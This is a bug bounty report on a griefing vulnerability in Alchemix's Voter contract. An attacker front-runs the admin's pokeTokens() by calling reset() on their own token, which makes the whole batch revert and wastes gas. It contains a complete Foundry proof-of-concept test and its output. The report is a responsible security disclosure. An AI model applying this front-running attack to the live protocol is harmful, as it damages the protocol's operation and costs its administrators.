# 31514 - \[SC - Medium] Malicious users can cause pokeTokens to revert

Submitted on May 20th 2024 at 22:41:29 UTC by @Django for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31514

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The voter admin can poke tokens to ensure that they accrue their FLUX and that their votes are reset. In the case where a token's lock has expired in the VE contract, the token is fully reset via `voter.reset()`. The admin passes in an array of tokens to reset. However, a griefer can cause the entire call to revert by simply frontrunning and resetting their own token.

This will:

* Cost the Alchemix admin wasted gas
* Delay the process to reset gauge votes

## Vulnerability Details

After an epoch ends, the Voter admin can reset tokens by calling `pokeTokens()`.

```
    function pokeTokens(uint256[] memory _tokenIds) external {
        require(msg.sender == admin, "not admin");
        for (uint256 i = 0; i < _tokenIds.length; i++) {
            uint256 _tokenId = _tokenIds[i];
            // If the token has expired, reset it
            if (block.timestamp > IVotingEscrow(veALCX).lockEnd(_tokenId)) {
                reset(_tokenId);
            }
            poke(_tokenId);
        }
    }
```

As seen above, if a token's lock has ended, it also calls `reset()` for the token.

```
    function reset(uint256 _tokenId) public onlyNewEpoch(_tokenId) {
        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }


        lastVoted[_tokenId] = block.timestamp;
        _reset(_tokenId);
        IVotingEscrow(veALCX).abstain(_tokenId);
        IFluxToken(FLUX).accrueFlux(_tokenId);
    }
```

The `reset()` function can revert due to its modifier `onlyNewEpoch()`:

```
    modifier onlyNewEpoch(uint256 _tokenId) {
        // Ensure new epoch since last vote
        require((block.timestamp / DURATION) * DURATION > lastVoted[_tokenId], "TOKEN_ALREADY_VOTED_THIS_EPOCH");
        _;
    }
```

Therefore, a griefer can vote with multiple tokens and simply frontrun any admin call to `pokeTokens()`. A single token that has already been reset will cause the entire function call to fail. On mainnet, this can be a costly revert due to numerous writes to storage. If the malicious token is near the end of the array, it could waste significant gas.

## Impact Details

* Cost the Alchemix admin wasted gas
* Delay the process to reset gauge votes

## Output from POC

```
[PASS] testGriefPokeTokens() (gas: 7570291)
Logs:
  Beef frontruns pokeTokens() call and resets last token in array (tokenId5).
  Admin pokeTokens() reverts. Gas cost is high because last token caused revert.
  Remove tokenId5 from array and try again.
  Beef frontruns pokeTokens() call and resets last token in array (tokenId4).
  Admin pokeTokens() reverts. Gas cost is high because last token caused revert.
  Remove tokenId4 from array and try again.
  Beef frontruns pokeTokens() call and resets last token in array (tokenId3).
  Admin pokeTokens() reverts. Gas cost is high because last token caused revert.
  Remove tokenId3 from array and try again.
  Admin finally calls pokeTokens() successfully.
```

## Proof of Concept

```
function testGriefPokeTokens() public {
        // Kick off epoch cycle
        hevm.warp(newEpoch());
        voter.distribute();

        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, 3 weeks, false);
        uint256 tokenId2 = createVeAlcx(admin, TOKEN_1, 3 weeks, false);
        uint256 tokenId3 = createVeAlcx(beef, TOKEN_1, 3 weeks, false);
        uint256 tokenId4 = createVeAlcx(beef, TOKEN_1, 3 weeks, false);
        uint256 tokenId5 = createVeAlcx(beef, TOKEN_1, 3 weeks, false);

        uint256[] memory tokens = new uint256[](5);
        tokens[0] = tokenId1;
        tokens[1] = tokenId2;
        tokens[2] = tokenId3;
        tokens[3] = tokenId4;
        tokens[4] = tokenId5;

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        hevm.startPrank(admin);
        // Vote and record used weights
        voter.vote(tokenId1, pools, weights, 0);
        voter.vote(tokenId2, pools, weights, 0);
        hevm.stopPrank();

        hevm.startPrank(beef);
        voter.vote(tokenId3, pools, weights, 0);
        voter.vote(tokenId4, pools, weights, 0);
        voter.vote(tokenId5, pools, weights, 0);
        hevm.stopPrank();

        hevm.startPrank(admin);
        uint256 usedWeight1 = voter.usedWeights(tokenId2);
        uint256 totalWeight1 = voter.totalWeight();

        // Move forward 3 weeks to expire locks
        hevm.warp(newEpoch());
        hevm.warp(newEpoch());
        hevm.warp(newEpoch());
        voter.distribute();

        // Move to when token1 expires
        hevm.warp(block.timestamp + 3 weeks);

        // Mock poking idle tokens to sync voting
        hevm.stopPrank();

        console.log("Beef frontruns pokeTokens() call and resets last token in array (tokenId5).");
        hevm.prank(beef);
        voter.reset(tokenId5);

        console.log("Admin pokeTokens() reverts. Gas cost is high because last token caused revert.");
        hevm.prank(voter.admin());
        hevm.expectRevert(abi.encodePacked("TOKEN_ALREADY_VOTED_THIS_EPOCH"));
        voter.pokeTokens(tokens);

        console.log("Remove tokenId5 from array and try again.");
        uint256[] memory tokens2 = new uint256[](4);
        tokens2[0] = tokenId1;
        tokens2[1] = tokenId2;
        tokens2[2] = tokenId3;
        tokens2[3] = tokenId4;

        console.log("Beef frontruns pokeTokens() call and resets last token in array (tokenId4).");
        hevm.prank(beef);
        voter.reset(tokenId4);

        console.log("Admin pokeTokens() reverts. Gas cost is high because last token caused revert.");
        hevm.prank(voter.admin());
        hevm.expectRevert(abi.encodePacked("TOKEN_ALREADY_VOTED_THIS_EPOCH"));
        voter.pokeTokens(tokens2);

        console.log("Remove tokenId4 from array and try again.");
        uint256[] memory tokens3 = new uint256[](3);
        tokens3[0] = tokenId1;
        tokens3[1] = tokenId2;
        tokens3[2] = tokenId3;

        console.log("Beef frontruns pokeTokens() call and resets last token in array (tokenId3).");
        hevm.prank(beef);
        voter.reset(tokenId3);

        console.log("Admin pokeTokens() reverts. Gas cost is high because last token caused revert.");
        hevm.prank(voter.admin());
        hevm.expectRevert(abi.encodePacked("TOKEN_ALREADY_VOTED_THIS_EPOCH"));
        voter.pokeTokens(tokens3);

        console.log("Remove tokenId3 from array and try again.");
        uint256[] memory tokens4 = new uint256[](2);
        tokens4[0] = tokenId1;
        tokens4[1] = tokenId2;

        console.log("Admin finally calls pokeTokens() successfully.");
        hevm.prank(voter.admin());
        voter.pokeTokens(tokens4);
    }
```
